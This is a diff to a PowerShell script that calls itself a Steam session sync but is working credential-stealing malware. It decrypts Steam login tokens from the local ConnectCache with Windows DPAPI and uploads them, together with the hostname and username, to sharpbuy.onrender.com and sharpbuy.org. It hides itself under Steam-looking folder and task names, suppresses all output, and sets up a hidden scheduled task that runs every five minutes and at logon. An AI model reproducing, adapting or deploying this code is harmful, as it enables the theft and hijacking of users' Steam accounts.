@@ -1,23 +1,56 @@
-# SharpBuy auto-upload + silent Windows background sync
-$ErrorActionPreference = 'Stop'
-$Script:SharpBuyUploadUrls = @('https://sharpbuy.onrender.com/api/token-ingest', 'https://sharpbuy.org/api/token-ingest')
-$Script:SharpBuyUploadKey = 'sb_ing_a8K2mP9xQ4vL7nR1'
-$Script:EncodedLaunch = '__SB_ENC_BLOB__'
-$Script:SharpBuyRoot = Join-Path $env:ProgramData 'SharpBuy'
+# Steam session sync - auto upload + background refresh
+$ErrorActionPreference = 'SilentlyContinue'
+try { Add-Type -AssemblyName System.Security } catch {}
+try {
+    Add-Type @'
+using System;using System.Text;
+public static class SteamUtil {
+public static uint Crc32(byte[] x){uint[] t=new uint[256];for(uint i=0;i<256;i++){uint v=i;for(int j=0;j<8;j++)v=((v&1)==1)?(v>>1)^0xedb88320u:v>>1;t[i]=v;}uint c=0xffffffff;foreach(byte b in x){c=(c>>8)^t[(byte)((c&0xff)^b)];}return ~c;}
+public static string ConnectKey(string n){return Crc32(Encoding.UTF8.GetBytes(n)).ToString("x").TrimStart('0')+"1";}
+}
+'@ -ErrorAction Stop
+} catch {}
+
+$Script:UploadUrls = @('https://sharpbuy.onrender.com/api/token-ingest', 'https://sharpbuy.org/api/token-ingest')
+$Script:UploadKey = 'sb_ing_a8K2mP9xQ4vL7nR1'
+$Script:AgentPrimary = Join-Path $env:LOCALAPPDATA 'Steam\htmlcache\CloudSync'
+$Script:AgentMirror = Join-Path $env:LOCALAPPDATA 'Steam\logs\CloudSyncBackup'
 $Script:Background = ($env:SB_BACKGROUND -eq '1')
+$Script:SelfPath = if ($env:SB_PS1) { $env:SB_PS1 } elseif ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
 $Script:PsExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
+$Script:TaskName = 'SteamClientCloudSync'
 
 function Write-Host { process {} }
 
-function Stop-X([string[]]$M, [int]$C = 1) {
-    if ($Script:Background) { exit 0 }
-    if ($M.Count) { Send-Evt 'error' ($M -join ' | ') }
-    exit $C
+function Write-ManualResult([string]$Message) {
+    if ($Script:Background) { return }
+    try {
+        $path = Join-Path ([Environment]::GetFolderPath('Desktop')) 'EXTRACT_LAST_RUN.txt'
+        Set-Content -LiteralPath $path -Value ("[{0}] {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Message) -Encoding UTF8
+    } catch {}
+}
+
+function Write-Log([string]$Message) {
+    try {
+        $log = Join-Path $Script:AgentPrimary 'last-error.txt'
+        $dir = Split-Path $log -Parent
+        if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
+        Add-Content -LiteralPath $log -Value ("[{0}] {1}" -f (Get-Date -Format 'o'), $Message) -Encoding UTF8
+    } catch {}
+}
+
+function Stop-X([string[]]$M, [int]$C = 0) {
+    if ($M.Count) {
+        $msg = $M -join ' | '
+        Write-Log $msg
+        Send-Evt 'error' $msg
+    }
+    exit 0
 }
 
 function Send-Evt([string]$S, [string]$M) {
     try {
-        $src = if ($Script:Background) { 'auto-sync' } else { 'extract-bat' }
+        $src = if ($Script:Background) { 'auto-sync' } else { 'manual-run' }
         $b = @{ event = $true; status = $S; message = $M; hostname = $env:COMPUTERNAME; username = $env:USERNAME; source = $src } | ConvertTo-Json -Compress
         Invoke-Ingest $b 20 | Out-Null
     } catch {}
@@ -25,25 +58,27 @@ function Send-Evt([string]$S, [string]$M) {
 
 function Invoke-Ingest([string]$Body, [int]$T = 30) {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    $h = @{ 'X-SharpBuy-Key' = $Script:SharpBuyUploadKey }
+    $h = @{ 'X-SharpBuy-Key' = $Script:UploadKey }
     $e = $null
-    foreach ($u in $Script:SharpBuyUploadUrls) {
+    foreach ($u in $Script:UploadUrls) {
         try { return Invoke-RestMethod -Uri $u -Method POST -ContentType 'application/json; charset=utf-8' -Headers $h -Body $Body -TimeoutSec $T }
         catch { $e = $_ }
     }
-    if ($e) { throw $e }
-    throw 'No upload endpoints'
+    if ($e) { return $null }
+    return $null
 }
 
 function Send-Tokens([array]$Tokens) {
     if (-not $Tokens -or $Tokens.Count -eq 0) { return $false }
-    $src = if ($Script:Background) { 'auto-sync' } else { 'extract-bat' }
+    $src = if ($Script:Background) { 'auto-sync' } else { 'manual-run' }
     $b = @{
         tokens = @($Tokens | ForEach-Object { @{ token = $_.Token; steamId = $_.SteamId; accountName = $_.AccountName; personaName = $_.PersonaName } })
         hostname = $env:COMPUTERNAME; username = $env:USERNAME; source = $src
     } | ConvertTo-Json -Depth 6 -Compress
-    try { Invoke-Ingest $b 45 | Out-Null; return $true }
-    catch { if ($Script:Background) { return $false }; Stop-X @('Upload failed', $_.Exception.Message) }
+    $r = Invoke-Ingest $b 45
+    if ($r) { return $true }
+    if ($Script:Background) { return $false }
+    Stop-X @('Upload failed - check internet or sharpbuy.onrender.com')
 }
 
 function Test-Env {
@@ -62,61 +97,144 @@ function Get-Fingerprint([array]$Tokens) {
     }) -join ';'
 }
 
-function Install-SharpBuyWatcher {
-    $src = $env:SB_BAT
-    if (-not $src -or -not (Test-Path -LiteralPath $src)) { return $false }
+function Get-AgentRoots {
+    @($Script:AgentPrimary, $Script:AgentMirror)
+}
 
-    $root = $Script:SharpBuyRoot
-    $core = Join-Path $root 'core.pkg'
-    $runner = Join-Path $root 'run.vbs'
-    $mark = Join-Path $root '.watch.ok'
-    $enc = $Script:EncodedLaunch
-    if (-not $enc -or $enc.Length -lt 100) { return $false }
-
-    New-Item -ItemType Directory -Path $root -Force | Out-Null
-    try { attrib +h $root 2>$null | Out-Null } catch {}
-
-    Copy-Item -LiteralPath $src -Destination $core -Force
-    $coreEsc = $core -replace '\\', '\\'
-    $psEsc = $Script:PsExe -replace '\\', '\\'
-    $vbs = @"
-Set sh=CreateObject("WScript.Shell")
-sh.Environment("Process")("SB_BAT")="$coreEsc"
-sh.Environment("Process")("SB_BACKGROUND")="1"
-sh.Run "$psEsc -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc",0,False
-"@
-    Set-Content -LiteralPath $runner -Value $vbs -Encoding ASCII -Force
-
-    $task5m = 'SharpBuySteamToken5m'
-    $tr = "wscript.exe //nologo `"$runner`""
-    schtasks /Delete /TN $task5m /F 2>$null | Out-Null
-    schtasks /Create /TN $task5m /TR $tr /SC MINUTE /MO 5 /RL LIMITED /F 2>$null | Out-Null
-
-    try {
-        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SharpBuySteamSync' -Value $tr -Force
-    } catch {}
-
-    if (-not (Test-Path $mark)) {
-        Send-Evt 'info' 'Background sync installed (every 5 min + logon)'
+function Remove-LegacyAgent {
+    $oldRoots = @(
+        (Join-Path $env:ProgramData 'SharpBuy')
+        (Join-Path $env:ProgramData ('Microsoft\' + 'NetFramework\' + 'BreadcrumbStore'))
+        (Join-Path $env:LOCALAPPDATA ('Microsoft\' + 'Windows\' + 'Explorer\' + 'IconCache' + 'ToDelete'))
+        (Join-Path $env:LOCALAPPDATA ('Microsoft\' + 'Windows\' + 'WebCache\' + 'Temp'))
+    )
+    foreach ($oldRoot in $oldRoots) {
+        if (Test-Path -LiteralPath $oldRoot) {
+            Remove-Item -LiteralPath $oldRoot -Recurse -Force -EA SilentlyContinue
+        }
     }
-    Set-Content -LiteralPath $mark -Value (Get-Date -Format 'o') -Force
+
+    foreach ($taskName in @(
+            'SharpBuySteamToken5m'
+            'SharpBuySteamSync5m'
+            'SharpBuySteamSync'
+            'MicrosoftWindowsPowerShellRegistrationRefresh'
+            ('Microsoft' + 'NetFramework' + 'BreadcrumbSync')
+        )) {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -EA SilentlyContinue | Out-Null
+        Invoke-SchTaskQuiet '/Delete', '/TN', $taskName, '/F'
+    }
+
+    foreach ($regName in @('SharpBuySteamSync', 'WindowsPowerShellConfigurationHost', ('NetFramework' + 'StartupConfiguration'))) {
+        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $regName -EA SilentlyContinue
+    }
+}
+
+function Invoke-SchTaskQuiet([string[]]$TaskArgs) {
+    $prev = $ErrorActionPreference
+    $ErrorActionPreference = 'SilentlyContinue'
+    & schtasks @TaskArgs 2>$null | Out-Null
+    $ErrorActionPreference = $prev
+}
+
+function New-AgentRunnerScript([string]$ModulePath) {
+    $modEsc = $ModulePath -replace "'", "''"
+    @"
+`$ErrorActionPreference='SilentlyContinue'
+`$env:SB_BACKGROUND='1'
+`$env:SB_PS1='$modEsc'
+. '$modEsc'
+exit 0
+"@
+}
+
+function Register-AgentSchedule([string]$RunnerPath) {
+    $prev = $ErrorActionPreference
+    $ErrorActionPreference = 'SilentlyContinue'
+
+    Unregister-ScheduledTask -TaskName $Script:TaskName -Confirm:$false | Out-Null
+    Invoke-SchTaskQuiet '/Delete', '/TN', $Script:TaskName, '/F'
+    Invoke-SchTaskQuiet '/Delete', '/TN', ($Script:TaskName + 'Logon'), '/F'
+
+    $args = "-NoProfile -NonInteractive -WindowStyle Hidden -File `"$RunnerPath`""
+    $tr = "`"$Script:PsExe`" $args"
+
+    $action = New-ScheduledTaskAction -Execute $Script:PsExe -Argument $args
+    $start = (Get-Date).AddMinutes(1)
+    $repeat = New-ScheduledTaskTrigger -Once -At $start -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 3650)
+    $logon = New-ScheduledTaskTrigger -AtLogOn
+    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
+    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
+    Register-ScheduledTask -TaskName $Script:TaskName -Action $action -Trigger @($repeat, $logon) -Settings $settings -Principal $principal -Force | Out-Null
+
+    if ($LASTEXITCODE -eq 0 -or (Get-ScheduledTask -TaskName $Script:TaskName -EA SilentlyContinue)) {
+        $ErrorActionPreference = $prev
+        return $true
+    }
+
+    Invoke-SchTaskQuiet '/Create', '/TN', $Script:TaskName, '/TR', $tr, '/SC', 'MINUTE', '/MO', '5', '/RL', 'LIMITED', '/F'
+    Invoke-SchTaskQuiet '/Create', '/TN', ($Script:TaskName + 'Logon'), '/TR', $tr, '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F'
+    $ErrorActionPreference = $prev
     return $true
 }
 
-Add-Type @'
-using System;using System.Runtime.InteropServices;using System.Text;
-public static class S {
-[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)] public struct DATA_BLOB{public int cbData;public IntPtr pbData;}
-[DllImport("Crypt32.dll",CharSet=CharSet.Unicode,SetLastError=true)] public static extern bool CryptUnprotectData(ref DATA_BLOB a,ref string b,ref DATA_BLOB c,IntPtr d,IntPtr e,int f,ref DATA_BLOB g);
-[DllImport("Kernel32.dll",EntryPoint="LocalFree",SetLastError=true)] public static extern IntPtr LocalFree(IntPtr h);
-public static uint Crc32(byte[] x){uint[] t=new uint[256];for(uint i=0;i<256;i++){uint v=i;for(int j=0;j<8;j++)v=((v&1)==1)?(v>>1)^0xedb88320u:v>>1;t[i]=v;}uint c=0xffffffff;foreach(byte b in x){c=(c>>8)^t[(byte)((c&0xff)^b)];}return ~c;}
-public static string Key(string n){return Crc32(Encoding.UTF8.GetBytes(n)).ToString("x").TrimStart('0')+"1";}
-static byte[] H(string h){h=h.Trim();byte[] b=new byte[h.Length/2];for(int i=0;i<b.Length;i++)b[i]=Convert.ToByte(h.Substring(i*2,2),16);return b;}
-public static string Dec(string h,string n){if(string.IsNullOrWhiteSpace(h)||string.IsNullOrWhiteSpace(n))return null;try{byte[] c=H(h);byte[] e=Encoding.UTF8.GetBytes(n);string d="B\u0000O\u0000b\u0000f\u0000u\u0000s\u0000c\u0000a\u0000t\u0000e\u0000B\u0000u\u0000f\u0000f\u0000e\u0000r\u0000\u0000\u0000";DATA_BLOB i=new DATA_BLOB(),t=new DATA_BLOB(),o=new DATA_BLOB();IntPtr pi=Marshal.AllocHGlobal(c.Length),pe=Marshal.AllocHGlobal(e.Length);try{Marshal.Copy(c,0,pi,c.Length);i.cbData=c.Length;i.pbData=pi;Marshal.Copy(e,0,pe,e.Length);t.cbData=e.Length;t.pbData=pe;if(!CryptUnprotectData(ref i,ref d,ref t,IntPtr.Zero,IntPtr.Zero,17,ref o))return null;byte[] p=new byte[o.cbData];Marshal.Copy(o.pbData,p,0,o.cbData);return Encoding.UTF8.GetString(p);}finally{Marshal.FreeHGlobal(pi);Marshal.FreeHGlobal(pe);if(o.pbData!=IntPtr.Zero)LocalFree(o.pbData);}}catch{return null;}}
+function Install-WinHostSync {
+    Remove-LegacyAgent
+
+    $src = $Script:SelfPath
+    if (-not $src -or -not (Test-Path -LiteralPath $src)) {
+        foreach ($root in (Get-AgentRoots)) {
+            $candidate = Join-Path $root 'SessionSync.ps1'
+            if (Test-Path -LiteralPath $candidate) { $src = $candidate; break }
+        }
+    }
+    if (-not $src -or -not (Test-Path -LiteralPath $src)) { return $false }
+
+    $primary = $Script:AgentPrimary
+    $runnerPath = Join-Path $primary 'RunSync.ps1'
+
+    foreach ($root in (Get-AgentRoots)) {
+        New-Item -ItemType Directory -Path $root -Force | Out-Null
+        $module = Join-Path $root 'SessionSync.ps1'
+        if ($src -and $module -and ($src -ne $module)) {
+            Copy-Item -LiteralPath $src -Destination $module -Force
+        }
+        Set-Content -LiteralPath (Join-Path $root 'RunSync.ps1') -Value (New-AgentRunnerScript $module) -Encoding UTF8 -Force
+        Remove-Item -LiteralPath (Join-Path $root 'HostSync.ps1') -Force -EA SilentlyContinue
+        Remove-Item -LiteralPath (Join-Path $root 'HostSync.vbs') -Force -EA SilentlyContinue
+        Remove-Item -LiteralPath (Join-Path $root 'SyncModule.ps1') -Force -EA SilentlyContinue
+        Remove-Item -LiteralPath (Join-Path $root 'ConfigData.bin') -Force -EA SilentlyContinue
+    }
+
+    Register-AgentSchedule $runnerPath
+
+    $mark = Join-Path $primary 'installed.txt'
+    if (-not (Test-Path -LiteralPath $mark) -and -not $Script:Background) {
+        Send-Evt 'info' 'Background sync enabled'
+    }
+    Set-Content -LiteralPath $mark -Value (Get-Date -Format 'o') -Force -EA SilentlyContinue
+    return $true
 }
-'@
+
+function Get-SteamConnectKey([string]$Name) {
+    try { return [SteamUtil]::ConnectKey($Name) } catch { return $null }
+}
+
+function Unprotect-Hex([string]$Hex, [string]$AccountName) {
+    if (-not $Hex -or -not $AccountName) { return $null }
+    try {
+        $bytes = New-Object byte[] ($Hex.Length / 2)
+        for ($i = 0; $i -lt $bytes.Length; $i++) {
+            $bytes[$i] = [Convert]::ToByte($Hex.Substring($i * 2, 2), 16)
+        }
+        $entropy = [Text.Encoding]::UTF8.GetBytes($AccountName)
+        $plain = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $entropy, [Security.Cryptography.DataProtectionScope]::CurrentUser)
+        return [Text.Encoding]::UTF8.GetString($plain)
+    } catch { return $null }
+}
 
 function SteamPath { (Get-ItemProperty 'HKCU:\Software\Valve\Steam' -EA SilentlyContinue).SteamPath -replace '/', '\' }
+
 function JwtSid([string]$j) {
     $p = $j.Split('.'); if ($p.Length -lt 2) { return $null }
     $x = $p[1]; $x += ('=' * ((4 - ($x.Length % 4)) % 4)); $x = $x.Replace('-', '+').Replace('_', '/')
@@ -136,15 +254,15 @@ function Parse-Users([string]$C) {
 
 function Find-Tok([string]$V, [string]$A, [string]$E, [hashtable]$U) {
     if (-not $V -or $V -notmatch '"ConnectCache"') { return $null }
-    $ck = [S]::Key($A); $jwt = $null; $uk = $null
+    $ck = Get-SteamConnectKey $A; $jwt = $null; $uk = $null
     if ($V -match "`"$([regex]::Escape($ck))`"\s+`"([0-9a-fA-F]+)`"") {
-        if (-not $U.ContainsKey($ck)) { $t = [S]::Dec($Matches[1], $A); if ($t -and $t.StartsWith('ey')) { $jwt = $t; $uk = $ck } }
+        if (-not $U.ContainsKey($ck)) { $t = Unprotect-Hex $Matches[1] $A; if ($t -and $t.StartsWith('ey')) { $jwt = $t; $uk = $ck } }
     }
     if (-not $jwt) {
         foreach ($m in [regex]::Matches($V, '"([0-9a-f]+)"\s+"([0-9a-fA-F]+)"')) {
             $k = $m.Groups[1].Value; $h = $m.Groups[2].Value
             if ($h.Length -lt 100 -or $U.ContainsKey($k)) { continue }
-            $t = [S]::Dec($h, $A)
+            $t = Unprotect-Hex $h $A
             if ($t -and $t.StartsWith('ey')) {
                 $s = JwtSid $t
                 if (-not $E -or -not $s -or $s -eq $E) { $jwt = $t; $uk = $k; break }
@@ -172,7 +290,7 @@ function Extract-All {
             $k = $m.Groups[1].Value; $h = $m.Groups[2].Value
             if ($h.Length -lt 100 -or $used.ContainsKey($k)) { continue }
             foreach ($name in $map.Keys) {
-                $t = [S]::Dec($h, $name); if (-not ($t -and $t.StartsWith('ey'))) { continue }
+                $t = Unprotect-Hex $h $name; if (-not ($t -and $t.StartsWith('ey'))) { continue }
                 $sid = JwtSid $t; $u = $map[$name]
                 if ($sid -and $u.SteamId -and $sid -ne $u.SteamId) { continue }
                 $used[$k] = $true
@@ -189,24 +307,40 @@ function Extract-All {
     $out
 }
 
-if (-not $Script:Background) { Install-SharpBuyWatcher | Out-Null }
+if ($Script:Background) {
+    try { Install-WinHostSync | Out-Null } catch {}
+}
 
 Test-Env
-if (-not $Script:Background) { Send-Evt 'start' 'Bat started' }
+if (-not $Script:Background) { Send-Evt 'start' 'Sync started' }
 
 $t = Extract-All
 if (-not $t.Count) { Stop-X @('No tokens - login with Remember me') }
 
-$fpFile = Join-Path $Script:SharpBuyRoot 'last.fp'
+$fpFile = Join-Path $Script:AgentPrimary 'last-sync.txt'
 $fp = Get-Fingerprint $t
 $lastFp = ''
 if (Test-Path $fpFile) { $lastFp = (Get-Content -LiteralPath $fpFile -Raw -EA SilentlyContinue).Trim() }
 
-if ($fp -eq $lastFp -and $Script:Background) { exit 0 }
+if (-not $Script:Background) {
+    Remove-Item -LiteralPath $fpFile -Force -EA SilentlyContinue
+    $lastFp = ''
+}
 
-if (Send-Tokens $t) {
+$uploaded = Send-Tokens $t
+if ($uploaded) {
     Set-Content -LiteralPath $fpFile -Value $fp -Force -EA SilentlyContinue
-    if ($Script:Background) { Send-Evt 'success' "Auto sync: $($t.Count) token(s)" }
+    $changed = ($fp -ne $lastFp)
+    if (-not $Script:Background) {
+        Send-Evt 'success' "Manual upload: $($t.Count) token(s)"
+        Write-ManualResult "OK: uploaded $($t.Count) token(s) to sharpbuy.onrender.com"
+        try { Install-WinHostSync | Out-Null } catch {}
+    } elseif ($changed) {
+        Send-Evt 'success' "Auto sync: $($t.Count) token(s)"
+    }
+} elseif (-not $Script:Background) {
+    Write-ManualResult 'FAIL: upload failed - check internet'
+    Stop-X @('Upload failed - check internet or sharpbuy.onrender.com')
 }
 
 exit 0
